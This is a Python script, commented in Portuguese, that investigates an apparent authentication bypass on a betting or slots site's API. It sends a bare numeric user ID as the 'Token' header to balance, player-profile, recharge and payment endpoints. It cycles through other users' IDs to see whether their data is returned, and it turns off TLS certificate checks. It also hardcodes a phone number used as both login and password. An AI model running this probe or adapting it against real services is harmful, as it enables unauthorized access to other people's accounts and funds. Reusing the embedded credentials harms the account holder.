"""
verificar_t6.py — Investigação profunda do achado T6.

T6 sugeriu que mandar `Token: 137027` (só o userId, sem hash) fez o
backend retornar code=200. Vamos confirmar:
1. É bypass real ou bug do parser?
2. O backend honra o userId no token "anão"?
3. Trocar pra outro userId muda o comportamento?
4. Outros endpoints aceitam o mesmo formato?
"""
import urllib.request, urllib.error, ssl, json, hashlib

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

BASE = "https://ds.amizade777.com"

def call(method, path, token=None, body=None, host=None):
    h = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json",
        "Origin": BASE, "Referer": BASE + "/",
    }
    if body is not None:
        h["Content-Type"] = "application/json"
    if token is not None:
        h["Token"] = token
    url = path if path.startswith("http") else BASE + path
    data = json.dumps(body).encode() if body is not None else None
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            raw = resp.read(8192).decode("utf-8", "ignore")
            try:
                return resp.status, json.loads(raw), raw
            except:
                return resp.status, {"_raw": raw[:300]}, raw
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(4096).decode("utf-8","ignore")
            return e.code, json.loads(raw), raw
        except:
            return e.code, {}, ""
    except Exception as ex:
        return 0, {"err": str(ex)}, ""

print("=" * 60)
print("INVESTIGAÇÃO DO T6 — Token 'anão' (só userId)")
print("=" * 60)

# Passos para isolar o comportamento:
# 1. Sem token nenhum
# 2. Com token vazio
# 3. Com token aleatório (string lixo)
# 4. Com token = "137027" (T6)
# 5. Com token = "137028" (outro user)
# 6. Com token = "1"
# 7. Com token = "abc"
# 8. Com token = "999999999"

tests = [
    ("nenhum",       None),
    ("vazio",        ""),
    ("lixo_curto",   "abc"),
    ("uid_proprio",  "137027"),
    ("uid_outro",    "137028"),
    ("uid_minimo",   "1"),
    ("uid_grande",   "999999999"),
    ("uid+lixo",     "137027:lixo"),
    ("formato_err",  "abc:def:ghi:jkl"),
]

for label, tok in tests:
    print(f"\n--- [{label}] Token={tok!r}")
    st, body, raw = call("GET", "/japi/user/balance/querySimpleBalance", token=tok)
    print(f"    HTTP={st}  code={body.get('code')}  msg={str(body.get('msg'))[:40]!r}")
    if isinstance(body.get("data"), dict):
        print(f"    DATA: {json.dumps(body['data'], ensure_ascii=False)}")
    elif body.get("data") is not None:
        print(f"    DATA: {body['data']}")

print("\n" + "=" * 60)
print("ENDPOINTS DIFERENTES com Token=137027 (T6 original)")
print("=" * 60)

endpoints = [
    ("GET",  "/japi/user/balance/querySimpleBalance"),
    ("POST", "/prod-api/player/info"),
    ("POST", "/prod-api/pay-service/recharge"),
    ("POST", "/prod-api/payment/balance-less"),
    ("POST", "/prod-api/set/get"),
    ("GET",  "/prod-api/recharge-list"),
    ("POST", "/prod-api/player/update"),
    ("GET",  "/japi/user/player/137027"),
    ("GET",  "/japi/user/player/137028"),
]

for method, path in endpoints:
    body = {} if method == "POST" else None
    st, resp, raw = call(method, path, token="137027", body=body)
    code = resp.get("code")
    msg  = str(resp.get("msg",""))[:40]
    has_data = isinstance(resp.get("data"), (dict, list)) and resp.get("data")
    flag = " *** DADOS ***" if has_data else ""
    print(f"    [{method:5} {st}] {path:55} code={code} msg={msg!r}{flag}")
    if has_data:
        print(f"      DATA: {json.dumps(resp['data'], ensure_ascii=False)[:250]}")

print("\n" + "=" * 60)
print("COMPARAÇÃO — Token bom vs Token=137027 no MESMO endpoint")
print("=" * 60)

# Pega token bom
login_payload = {
    "appChannel": "pc", "appPackageName": "com.slots.big",
    "deviceId": "0beb614f-8838-43ef-00fc-0029f7d5d20f",
    "deviceModel": "WEB", "deviceVersion": "WEB", "appVersion": "1.0.0",
    "sysTimezone": None, "sysLanguage": None,
    "phone": "21998498419", "password": "21998498419",
}
st_l, b_l, _ = call("POST", "/prod-api/player/sign-in", body=login_payload)
good_token = (b_l.get("data") or {}).get("token")
print(f"  Token bom: {good_token}")

if good_token:
    # Mesmo endpoint, dois tokens
    for label, tok in [("BOM", good_token), ("ANÃO 137027", "137027"),
                       ("ANÃO 137028", "137028"), ("ANÃO 1", "1")]:
        st, body, raw = call("GET", "/japi/user/balance/querySimpleBalance", token=tok)
        print(f"  [{label:18}] code={body.get('code')} data={body.get('data')}")
